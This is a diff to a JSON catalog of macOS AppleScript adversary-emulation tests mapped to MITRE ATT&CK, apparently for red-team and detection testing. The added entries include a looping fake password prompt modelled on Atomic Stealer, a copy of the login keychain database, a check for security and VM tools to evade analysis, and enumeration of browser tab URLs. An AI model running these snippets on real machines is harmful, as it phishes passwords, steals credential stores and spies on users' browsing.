@@ -22,6 +22,28 @@
     "test_number": 1
   },
   {
+    "name": "Get the frontmost application (using AppKit)",
+    "command": "use framework \"Foundation\"\nuse framework \"AppKit\"\n\nset frontApp to current application's NSWorkspace's sharedWorkspace's frontmostApplication()\nset frontAppName to frontApp's localizedName() as text\nreturn frontAppName\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": false,
+    "description": "Returns the name of the currently active (frontmost) application by calling NSWorkspace via AppleScript-ObjC. Malware watches for a spoofed target application becoming frontmost before socially engineering the user.",
+    "technique_id": "T1010",
+    "technique_name": "Application Window Discovery",
+    "test_number": 2
+  },
+  {
+    "name": "Get the frontmost application (using System Events)",
+    "command": "tell application \"System Events\" to get name of first process whose frontmost is true",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": true,
+    "description": "Returns the name of the frontmost application using vanilla System Events, an alternative to the AppKit approach that does not reach into Cocoa frameworks.",
+    "technique_id": "T1010",
+    "technique_name": "Application Window Discovery",
+    "test_number": 3
+  },
+  {
     "name": "Test Internet connection",
     "command": "tell application \"Safari\"\n  try\n      activate\n      -- Open the URL in a new tab\n      tell window 1\n          set current tab to (make new tab with properties {URL:\"#{testURL}\"})\n      end tell\n\n      -- Wait for page to load\n      delay 3\n\n      -- Check if page loaded successfully by checking the URL or title\n      set currentURL to URL of current tab of window 1\n      set pageTitle to name of current tab of window 1\n\n      -- Close the test tab\n      close current tab of window 1\n\n      -- Check if we got a valid result\n      if currentURL contains \"#{testURL}\" and pageTitle does not contain \"can't\" and pageTitle does not contain \"error\" then\n        set connectionResult to true\n      else\n        set connectionResult to false\n      end if\n\n  on error\n    set connectionResult to false\n  end try\n\n  try\n    quit\n  end try\n  return connectionResult\nend tell",
     "language": "AppleScript",
@@ -94,8 +116,8 @@
     "elevation_required": false,
     "tcc_required": true,
     "description": "Store a Base64-encoded payload in the Finder comment (kMDItemFinderComment) Spotlight metadata field of a file. The payload resides outside the file's data fork, bypassing file-based security scanners and static analysis tools that focus on executable code and script contents.",
-    "technique_id": "T1027",
-    "technique_name": "Obfuscated Files or Information",
+    "technique_id": "T1027.013",
+    "technique_name": "Obfuscated Files or Information: Encrypted/Encoded File",
     "test_number": 1
   },
   {
@@ -148,10 +170,21 @@
     "language": "AppleScript",
     "elevation_required": false,
     "tcc_required": true,
-    "description": "Removes a specified login item from the user's login items list. This can be used to clean up persistence mechanisms or remove unwanted autostart entries.",
+    "description": "Displays a fake authentication dialog with a hidden answer field to trick the user into entering their macOS account password. Atomic Stealer (AMOS) uses this to harvest the login password.",
     "technique_id": "T1056.002",
     "technique_name": "Input Capture: GUI Input Capture",
     "test_number": 1
+  },
+  {
+    "name": "Loop password prompt until an answer is supplied",
+    "command": "set userPassword to \"\"\nrepeat until userPassword is not \"\"\n  try\n    set dialogResult to display dialog \"#{prompt}\" with title \"#{title}\" default answer \"\" with icon caution buttons {\"OK\"} default button \"OK\" with hidden answer\n    set userPassword to text returned of dialogResult\n  on error\n    set userPassword to \"\"\n  end try\nend repeat\nreturn userPassword\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": true,
+    "description": "Repeatedly presents a fake password dialog and refuses to dismiss it until a non-empty answer is entered, matching the Atomic Stealer behavior where the prompt pops until the user supplies a password. The captured value is returned rather than validated, so no shell is spawned.",
+    "technique_id": "T1056.002",
+    "technique_name": "Input Capture: GUI Input Capture",
+    "test_number": 2
   },
   {
     "name": "Get all processes",
@@ -370,7 +403,7 @@
     "tcc_required": true,
     "description": "Capture screenshot using System Events",
     "technique_id": "T1113",
-    "technique_name": "Input Capture",
+    "technique_name": "Screen Capture",
     "test_number": 1
   },
   {
@@ -528,6 +561,28 @@
     "test_number": 1
   },
   {
+    "name": "Enumerate all Safari tab URLs",
+    "command": "set urlList to {}\ntell application \"Safari\"\n  repeat with w in windows\n    repeat with t in tabs of w\n      set end of urlList to (URL of t)\n    end repeat\n  end repeat\nend tell\nreturn urlList\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": true,
+    "description": "Iterates every Safari window and tab and returns the URL of each open tab, giving a fuller picture of the victim's browsing session than the single front-document URL.",
+    "technique_id": "T1217",
+    "technique_name": "Browser Information Discovery",
+    "test_number": 2
+  },
+  {
+    "name": "Capture the active Google Chrome tab URL",
+    "command": "tell application \"Google Chrome\"\n  set curURL to URL of active tab of front window\n  return curURL\nend tell",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": true,
+    "description": "Returns the URL of the active tab in the front Google Chrome window. Browser hijackers read the current Chrome URL before redirecting search queries to attacker-controlled destinations.",
+    "technique_id": "T1217",
+    "technique_name": "Browser Information Discovery",
+    "test_number": 3
+  },
+  {
     "name": "Stop Application",
     "command": "tell application \"#{applicationName}\" to quit",
     "language": "AppleScript",
@@ -567,8 +622,8 @@
     "elevation_required": false,
     "tcc_required": false,
     "description": "Checks system memory profiler output for virtualization artifacts through AppleScript's do shell script command.",
-    "technique_id": "T1497",
-    "technique_name": "Virtualization/Sandbox Evasion",
+    "technique_id": "T1497.001",
+    "technique_name": "Virtualization/Sandbox Evasion: System Checks",
     "test_number": 1
   },
   {
@@ -578,8 +633,8 @@
     "elevation_required": false,
     "tcc_required": false,
     "description": "Checks hardware profiler output for common virtual machine indicators using AppleScript.",
-    "technique_id": "T1497",
-    "technique_name": "Virtualization/Sandbox Evasion",
+    "technique_id": "T1497.001",
+    "technique_name": "Virtualization/Sandbox Evasion: System Checks",
     "test_number": 2
   },
   {
@@ -592,6 +647,17 @@
     "technique_id": "T1518.001",
     "technique_name": "Security Software Discovery",
     "test_number": 1
+  },
+  {
+    "name": "Detect security and analysis tools among running applications",
+    "command": "use framework \"Foundation\"\nuse framework \"AppKit\"\n\nset watchList to {\"Little Snitch\", \"LuLu\", \"KnockKnock\", \"BlockBlock\", \"VirtualBox\", \"VMware Fusion\", \"Parallels Desktop\", \"Activity Monitor\", \"Wireshark\"}\nset foundList to {}\nset activeApps to current application's NSWorkspace's sharedWorkspace's runningApplications()\nrepeat with anApp in activeApps\n  try\n    set appName to (anApp's localizedName() as text)\n    if watchList contains appName then set end of foundList to appName\n  end try\nend repeat\nreturn foundList",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": false,
+    "description": "Enumerates running applications via NSWorkspace and returns any that match a list of security or virtualization tools (for example Little Snitch or VM software). Offensive actors use this AppleScript-ObjC check to avoid running when monitoring or analysis software is present.",
+    "technique_id": "T1518.001",
+    "technique_name": "Security Software Discovery",
+    "test_number": 2
   },
   {
     "name": "Shutdown system (using System Events)",
@@ -668,6 +734,17 @@
     "description": "This test searches for passwords in the bash history file.",
     "technique_id": "T1552.003",
     "technique_name": "Unsecured Credentials: Bash History",
+    "test_number": 1
+  },
+  {
+    "name": "Copy login keychain database",
+    "command": "tell application \"Finder\"\n  set destinationFolderPath to POSIX file \"#{destination_path}\"\n  set keychainPath to (path to library folder from user domain as text) & \"Keychains:login.keychain-db\"\n  duplicate file keychainPath to folder destinationFolderPath with replacing\nend tell\n",
+    "language": "AppleScript",
+    "elevation_required": false,
+    "tcc_required": true,
+    "description": "Copies the user's login keychain database to a staging directory using Finder. Stealers such as BANSHEE, Odyssey and Atomic collect login.keychain-db so the stored credentials can be decrypted offline once the account password is captured.",
+    "technique_id": "T1555.001",
+    "technique_name": "Credentials from Password Stores: Keychain",
     "test_number": 1
   },
   {
